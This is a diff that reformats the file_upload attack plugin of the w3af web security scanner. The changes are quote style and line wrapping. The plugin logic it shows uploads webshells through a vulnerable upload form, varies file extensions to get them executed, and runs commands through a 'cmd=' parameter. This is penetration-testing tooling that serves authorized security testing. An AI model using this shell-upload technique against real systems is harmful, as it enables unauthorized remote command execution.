@@ -19,6 +19,7 @@ along with w3af; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 """
+
 import w3af.core.controllers.output_manager as om
 import w3af.plugins.attack.payloads.shell_handler as shell_handler
 
@@ -43,7 +44,7 @@ class file_upload(AttackPlugin):
         """
         :return: The type of exploit, SHELL, PROXY, etc.
         """
-        return 'shell'
+        return "shell"
 
     def get_kb_location(self):
         """
@@ -56,7 +57,7 @@ class file_upload(AttackPlugin):
         Then the exploit plugin that exploits os_commanding
         ( attack.os_commanding ) should return 'os_commanding' in this method.
         """
-        return ['file_upload']
+        return ["file_upload"]
 
     def _generate_shell(self, vuln_obj):
         """
@@ -69,8 +70,9 @@ class file_upload(AttackPlugin):
         if exploit_url is not None:
 
             # Set shell parameters
-            shell_obj = FileUploadShell(vuln_obj, self._uri_opener,
-                                        self.worker_pool, exploit_url)
+            shell_obj = FileUploadShell(
+                vuln_obj, self._uri_opener, self.worker_pool, exploit_url
+            )
             return shell_obj
         else:
             return None
@@ -89,9 +91,9 @@ class file_upload(AttackPlugin):
         extension = url.get_extension()
 
         for file_content, file_name in self._get_web_shells(extension):
-            exploit_url = self._upload_shell_and_confirm_exec(vuln_obj,
-                                                              file_content,
-                                                              file_name)
+            exploit_url = self._upload_shell_and_confirm_exec(
+                vuln_obj, file_content, file_name
+            )
 
             if exploit_url is not None:
                 return exploit_url
@@ -119,9 +121,9 @@ class file_upload(AttackPlugin):
 
         # Call the uploaded script with an empty value in cmd parameter
         # this will return the shell_handler.SHELL_IDENTIFIER if success
-        dst = vuln_obj['file_dest']
+        dst = vuln_obj["file_dest"]
         exploit_url = dst.get_domain_path().url_join(file_name)
-        exploit_url.querystring = 'cmd='
+        exploit_url.querystring = "cmd="
         response = self._uri_opener.GET(exploit_url)
 
         if shell_handler.SHELL_IDENTIFIER in response.get_body():
@@ -136,13 +138,13 @@ class file_upload(AttackPlugin):
         for shell_str, orig_extension in shell_handler.get_webshells(extension):
             # If the webshell was webshell.php this will return a file_name
             # containing kgiwjxh.php (8 rand and the extension)
-            file_name = '%s.%s' % (rand_alpha(8), orig_extension)
+            file_name = "%s.%s" % (rand_alpha(8), orig_extension)
             yield shell_str, file_name
 
             # Now we want to return the webshell content <?php ... ?> but in a
             # file with the extension that the upload URL had. This makes our
             # chances of getting access a little greater
-            file_name = '%s.%s' % (rand_alpha(8), extension)
+            file_name = "%s.%s" % (rand_alpha(8), extension)
             yield shell_str, file_name
 
     def get_root_probability(self):
@@ -174,9 +176,9 @@ class FileUploadShell(ExecShell):
 
     def __init__(self, vuln, uri_opener, worker_pool, exploit_url):
         super(FileUploadShell, self).__init__(vuln, uri_opener, worker_pool)
-        
+
         self._exploit_url = exploit_url
-            
+
     def get_exploit_url(self):
         return self._exploit_url
 
@@ -193,13 +195,15 @@ class FileUploadShell(ExecShell):
         :return: The result of the command.
         """
         to_send = self.get_exploit_url()
-        to_send.querystring = 'cmd=' + command
+        to_send.querystring = "cmd=" + command
         response = self._uri_opener.GET(to_send)
         return shell_handler.extract_result(response.get_body())
 
     def end(self):
-        msg = 'File upload shell is going to delete the webshell that was'\
-              ' uploaded before.'
+        msg = (
+            "File upload shell is going to delete the webshell that was"
+            " uploaded before."
+        )
         om.out.debug(msg)
         file_to_del = self.get_exploit_url().get_file_name()
 
@@ -209,12 +213,14 @@ class FileUploadShell(ExecShell):
             msg = 'File upload shell cleanup failed with exception: "%s".'
             om.out.error(msg % e)
         else:
-            msg = 'File upload shell cleanup complete; successfully removed'\
-                  ' file: "%s".' % file_to_del
+            msg = (
+                "File upload shell cleanup complete; successfully removed"
+                ' file: "%s".' % file_to_del
+            )
             om.out.debug(msg)
 
     def get_name(self):
-        return 'file_upload'
+        return "file_upload"
 
     def __reduce__(self):
         """
